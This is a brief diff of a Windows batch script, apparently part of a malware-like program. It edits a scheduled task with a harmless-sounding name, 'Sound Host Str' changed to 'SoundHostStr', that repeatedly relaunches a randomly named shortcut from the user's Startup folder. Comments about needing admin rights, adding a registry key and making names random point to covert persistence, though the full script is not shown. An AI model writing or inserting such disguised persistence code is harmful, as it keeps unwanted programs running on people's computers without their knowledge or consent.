@@ -15,7 +15,7 @@ if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Progra
 ::Needs admin    
 ::Add REG key?
 )
-schtasks /create /tn "Sound Host Str" /tr "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk" /sc minute /mo 30
+schtasks /create /tn "SoundHostStr" /tr "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk" /sc minute /mo 256
 
 cd %path1%
 ::Make random
